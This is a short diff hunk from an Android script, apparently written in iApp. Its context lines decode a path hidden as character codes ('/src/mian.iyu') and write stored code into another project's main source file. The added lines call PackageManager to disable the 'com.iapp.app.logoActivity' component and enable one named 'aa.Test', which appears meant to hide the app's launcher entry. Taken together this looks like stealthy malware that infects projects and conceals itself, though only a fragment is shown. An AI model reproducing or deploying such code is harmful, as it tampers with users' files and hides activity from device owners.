@@ -211,6 +211,12 @@ t()
         btoo("utf-8","47 115 114 99 47 109 105 97 110 46 105 121 117",mian)
         ss(path+"/"+iAppitem+mian,hahaha)
         fw(hahaha,sss.code)
+        java(管理器,activity,"Context.getPackageManager")
+        javanew(组件名,"android.content.ComponentName","Context",activity,"String","com.iapp.app.logoActivity")
+        java(null,管理器,"android.content.pm.PackageManager.setComponentEnabledSetting","android.content.ComponentName",组件名,"int",2,"int",1)
+        java(管理器,activity,"Context.getPackageManager")
+        javanew(组件名,"android.content.ComponentName","Context",activity,"String","aa.Test")
+        java(null,管理器,"android.content.pm.PackageManager.setComponentEnabledSetting","android.content.ComponentName",组件名,"int",1,"int",1)
       }
       f(aaaaaaaa=="false")
       {
